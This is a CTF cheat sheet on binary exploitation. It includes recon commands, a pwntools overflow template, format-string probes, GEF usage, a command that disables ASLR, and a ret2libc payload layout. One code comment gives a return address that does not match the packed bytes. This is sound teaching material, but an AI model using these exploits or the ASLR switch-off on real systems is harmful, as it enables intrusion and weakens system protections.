# CTF Binary Exploitation Steps    

        file binary     #note architechure of the binary, are debugging symbols stripped?     
        strings binary   #note strings, function calls   
If a binary is not stripped of debugging symbols:    

        readelf -s program     
Open the binary in Ghidra, decompile it and look at the source code.   
ltrace: record library calls made in an executable to see what context they are used in.      

        ltrace ./program      
Basic pwntools exploit script in Python3:     
```
#!/usr/bin/env python3
from pwn import *
context.log_level = 'ERROR'
conn = remote("127.0.0.1", 1337)
offset = 100
#return address: x980592e3
shellcode = b''
payload = b'A'*offset + b'\xe3\x92\x05\x08' + shellcode 
conn.sendlineafter(":", payload)
conn.interactive()

```
## Format String Vulnerabilities     
Format parameter: Escape sequences - begins with a %, uses a single char shorthand. Common format parameters: %d, %u, %x, %p.            
Is user input passed to printf, scanf or similiar functions in a way you can control?    

        printf(variable);   //c code vulnerability   
        %x%x   #test as user input   
        %p %p    #print out pointer values - test to see if you can disclose vital info (like a flag)  
But what if the string contains a format parameter?? The format function should eval and try to access the function arg by adding to the frame pointer - if arg isn't there adding to the frame pointer will reference a piece of memory in a preceding stack frame.

## GEF    
[GEF Documentation](https://hugsy.github.io/gef/)    
Extend the features of GDB.    
Check security protections on a binary:     

    checksec filename  
    checksec     #if gdb is already attached to a process    

    pattern create 200    #create a pattern   
    pattern offset waab   #get the offset 

## Memory Protections   
NX: no execute.     
DEP: Data Execution Prevention, the CPU will not execute code in the heap or stack.       
ASLR:      
Canary:   

Switch off ASLR:      

                echo 0 > /proc/sys/kernel/randomize_va_space    
## Return Oriented Programming    
Avoid DEP

## ret2libc (Return to libc)     
[Return to Libc Explained](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)    
[Bypassing non-executable-stack during exploitation using return-to-libc](https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf)    
Exploit buffer overflows on systems where stack memory is protected with NX. For *nix systems.        
An attacker can't execute shellcode from the stack. ret2libc: bypass NX and use existing code from the standard C library shared object (/lib/i386-linux-gnu/libc-\*.so) that is loaded and mapped into the program's virtual address space. This is similiar to a standard stack buffer overflow, except the return address will point to the function system(const char *command) from the libc library. The program will be forced to jump to system() and execute injected shellcode as the command.                
payload = overflow + &system() + &exit() + &commmand       

        (gdb) p system  #find the memory address of system() from libc in the program's virtual memory    
        (gdb) p exit    #find the memory address of exit()
